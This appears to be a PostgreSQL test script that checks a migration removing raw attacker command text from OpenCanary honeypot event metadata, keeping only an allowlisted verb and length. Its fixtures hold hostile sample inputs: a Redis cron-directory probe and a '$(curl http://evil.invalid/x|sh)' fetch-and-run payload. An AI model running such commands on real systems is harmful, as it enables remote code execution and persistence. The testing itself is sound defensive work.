-- Verifies that the OpenCanary cmd cleansing migration removes raw command
-- strings, keeps only an allowlisted verb and length, and is idempotent.
-- Rolls back all fixtures.
\set ON_ERROR_STOP on

begin;

insert into public.sensors (id, name, type, region, is_active)
values ('sensor-meta-01', 'Metadata Sensor', 'combined', 'us-east-1', true);

insert into public.attack_events (
  id, sensor_id, observed_at, protocol, dst_port, event_type, attack_category,
  src_ip_hash, metadata
) values
  ('cccccccc-cccc-4ccc-8ccc-ccccccccccc1', 'sensor-meta-01', timestamptz '2026-11-21 01:00:00+00',
   'redis', 6379, 'redis_command_probe', 'auth_attempt', 'hash-m1',
   '{"logtype": 17001, "cmd": "config set dir /var/spool/cron"}'),
  ('cccccccc-cccc-4ccc-8ccc-ccccccccccc2', 'sensor-meta-01', timestamptz '2026-11-21 01:01:00+00',
   'redis', 6379, 'redis_command_probe', 'auth_attempt', 'hash-m2',
   '{"logtype": 17001, "cmd": "$(curl http://evil.invalid/x|sh)"}'),
  ('cccccccc-cccc-4ccc-8ccc-ccccccccccc3', 'sensor-meta-01', timestamptz '2026-11-21 01:02:00+00',
   'ssh', 22, 'ssh_remote_version', 'auth_attempt', 'hash-m3',
   '{"logtype": 4001, "remoteversion": "SSH-2.0-Go"}');

\ir ../migrations/20261123000001_sanitize_opencanary_cmd_metadata.sql
-- Second run must be a no-op.
\ir ../migrations/20261123000001_sanitize_opencanary_cmd_metadata.sql

do $$
declare
  v_remaining integer;
  v_m1 jsonb;
  v_m2 jsonb;
  v_m3 jsonb;
begin
  select count(*) into v_remaining
  from public.attack_events
  where sensor_id = 'sensor-meta-01' and metadata ? 'cmd';
  if v_remaining <> 0 then
    raise exception 'raw cmd metadata remains on % rows', v_remaining;
  end if;

  select metadata into v_m1 from public.attack_events where id = 'cccccccc-cccc-4ccc-8ccc-ccccccccccc1';
  select metadata into v_m2 from public.attack_events where id = 'cccccccc-cccc-4ccc-8ccc-ccccccccccc2';
  select metadata into v_m3 from public.attack_events where id = 'cccccccc-cccc-4ccc-8ccc-ccccccccccc3';

  if v_m1 <> '{"logtype": 17001, "cmd_verb": "CONFIG", "cmd_length": 30}'::jsonb then
    raise exception 'unexpected sanitized metadata for allowlisted verb: %', v_m1;
  end if;
  if v_m2 <> '{"logtype": 17001, "cmd_verb": "OTHER", "cmd_length": 32}'::jsonb then
    raise exception 'unexpected sanitized metadata for unknown command: %', v_m2;
  end if;
  if v_m3 <> '{"logtype": 4001, "remoteversion": "SSH-2.0-Go"}'::jsonb then
    raise exception 'rows without cmd must be untouched: %', v_m3;
  end if;
  if v_m1::text like '%/var/spool%' or v_m2::text like '%evil.invalid%' then
    raise exception 'attacker command text persisted after cleansing';
  end if;
end;
$$;

rollback;
